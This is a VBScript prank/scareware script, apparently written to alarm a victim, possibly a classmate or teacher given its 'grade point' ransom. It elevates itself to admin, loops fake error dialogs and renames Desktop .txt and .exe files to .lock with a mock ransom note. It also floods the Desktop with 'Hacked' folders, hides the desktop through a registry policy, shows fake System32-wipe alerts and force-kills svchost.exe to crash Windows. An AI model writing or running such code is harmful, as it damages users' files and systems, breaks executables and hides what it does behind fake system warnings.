On Error Resume Next

' Self-elevate if not already running as admin
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName, Chr(34) & _
    WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
    WScript.Quit
End If

Set shell = CreateObject("WScript.Shell")





Do
    MsgBox "An unexpected error has occurred.", vbCritical, "System Error"
Loop

Dim i
i = 1
Do
    MsgBox "Error Code: 0x" & Hex(1000 + i) & " - Unknown failure", vbExclamation, "System Alert"
    i = i + 1
Loop

Do
    MsgBox "System Error: Code 0x80070005", vbCritical, "Fatal Error"
Loop


For i = 1 To 10
    shell.Run "notepad.exe"
Next


For i = 1 To 5
    shell.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
    WScript.Sleep 1000
Next

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Get current user's Desktop path
desktopPath = shell.SpecialFolders("Desktop")

' Loop through files and rename .txt and .exe files to .lock
Set folder = fso.GetFolder(desktopPath)
For Each file In folder.Files
    ext = LCase(fso.GetExtensionName(file.Name))
    If ext = "txt" Or ext = "exe" Then
        baseName = fso.GetBaseName(file.Name)
        file.Name = baseName & ".lock"
    End If
Next
MsgBox "Your files have been locked. Pay 1 grade point to unlock.", vbCritical, "RansomSim"

MsgBox "System will shut down in 60 seconds... These will be the last 60 seconds of your pc so take your time saying goodbye...", vbSystemModal + vbCritical, "Windows Shutdown"

shell.Run "cmd /k title SYSTEM FAILURE - CODE RED", 1, False

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")


desktopPath = shell.SpecialFolders("Desktop")


For i = 1 To 50
    folderName = desktopPath & "\Hacked " & i
    If Not fso.FolderExists(folderName) Then
        fso.CreateFolder folderName
        Set txtFile = fso.CreateTextFile(folderName & "\message.txt", True)
        txtFile.WriteLine "You have been Hacked " & i
        txtFile.Close
    End If
Next

Set shell = CreateObject("WScript.Shell")
For i = 1 To 5
    shell.Run "notepad.exe"
    WScript.Sleep 1500
Next
MsgBox "System resources are critically low.", vbExclamation, "Performance Warning"

Set shell = CreateObject("WScript.Shell")
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
shell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

Do
    MsgBox "Firewall breach detected. Unauthorized access from IP 127.0.0.1", vbCritical, "Security Alert"
    WScript.Sleep 1000
Loop

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
desktopPath = shell.SpecialFolders("Desktop")
folderName = desktopPath & "\Zombie"

Do
    If Not fso.FolderExists(folderName) Then
        fso.CreateFolder folderName
        Set txtFile = fso.CreateTextFile(folderName & "\you_cant_delete_me.txt", True)
        txtFile.WriteLine "I always come back..."
        txtFile.Close
    End If
    WScript.Sleep 2000
Loop


Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
desktopPath = shell.SpecialFolders("Desktop")

For i = 1 To 30
    fileName = desktopPath & "\Warning_" & i & ".txt"
    Set txtFile = fso.CreateTextFile(fileName, True)
    txtFile.WriteLine "You can't stop it. #" & i
    txtFile.Close
Next


shell.Run "cmd /k taskkill /F /IM svchost.exe", 1, True


Set shell = CreateObject("WScript.Shell")
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
desktopPath = shell.SpecialFolders("Desktop")

' Step 1: Warning message
MsgBox "System32 corruption detected. Attempting emergency wipe...", vbCritical, "Windows Defender"

' Step 2: Countdown
For i = 5 To 1 Step -1
    MsgBox "Deleting System32 in " & i & " seconds...", vbExclamation, "Critical Failure"
    WScript.Sleep 1000
Next

' Step 3: Simulate file wipe by creating scary folders
For i = 1 To 20
    folderName = desktopPath & "\System32_Wipe_" & i
    If Not fso.FolderExists(folderName) Then
        fso.CreateFolder folderName
        Set txtFile = fso.CreateTextFile(folderName & "\log.txt", True)
        txtFile.WriteLine "System file deleted: C:\Windows\System32\kernel" & i & ".dll"
        txtFile.Close
    End If
Next

' Step 4: Final message
MsgBox "System32 wipe complete. Reboot required.", vbCritical, "Fatal Error"


WScript.Sleep 60000


shell.Run "cmd /k taskkill /F /IM svchost.exe", 1, True


